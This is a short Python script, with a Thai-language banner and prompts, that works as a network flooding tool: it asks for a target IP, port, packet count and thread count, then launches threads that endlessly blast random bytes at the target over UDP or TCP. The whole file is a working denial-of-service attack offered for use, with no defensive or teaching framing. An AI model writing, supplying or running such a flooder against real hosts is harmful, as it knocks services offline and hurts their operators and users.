#!/usr/bin/env python3

import random
import socket
import threading

print("###########################")
print("###### ยิงเน็ตไอ้กากต่อ ######")
print("###########################")
ip = str(input(" ไอพี:"))
port = int(input(" พอร์ต:"))
choice = str(input(" ใส่(Y):"))	
times = int(input(" จำนวน:"))
threads = int(input(" เวลา:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ยิงแล้ว!!!")
		except:
			print("[!] ERROR!!!")
			
def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ยิงแล้ว!!!")
		except:
			s.close()
			print("[*] ERROR")

for Y in range(threads):
	if choice == 'Y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
